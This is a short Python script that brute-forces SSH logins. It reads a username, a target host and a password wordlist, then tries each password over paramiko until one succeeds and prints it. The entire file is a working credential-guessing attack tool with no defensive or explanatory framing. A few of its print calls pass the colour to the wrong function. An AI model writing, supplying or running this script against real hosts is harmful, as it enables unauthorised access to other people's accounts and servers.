import paramiko, os, sys, socket, termcolor

# Collect data from user:

user = input('[+] Enter the username: ')
password = input('[+] Enter the passwords file: ')
host = input('[+] Enter the target website in format www.example.com: ')

# function to connect to the SSH server:
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    # additional exceptions
    except paramiko.BadAuthenticationType:
        code = 3
    except paramiko.BadHostKeyException:
        code = 4
    ssh.close()
    return code

# Open the file with the passwords:
if not os.path.exists(password):
        print('[!!] File Not Found')
        sys.exit(1)

with open(password, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password: ' + password + ', for account: ' + user), 'green'))
                break
            elif response == 1:
                print(termcolor.colored('[-] Incorrect login: ' + password), 'red')
            elif response == 2:
                print(termcolor.colored('[!!] Can\'t connect'), 'yellow')
                sys.exit(1)
            elif response == 3:
                print(termcolor.colored('[!!] Server is not allowing that authentication type'), 'red')
            elif response == 4:
                print(termcolor.colored('[!!] Unexpected key given from SSH server'), 'red')
        except Exception as e:
            print(e)
            continue
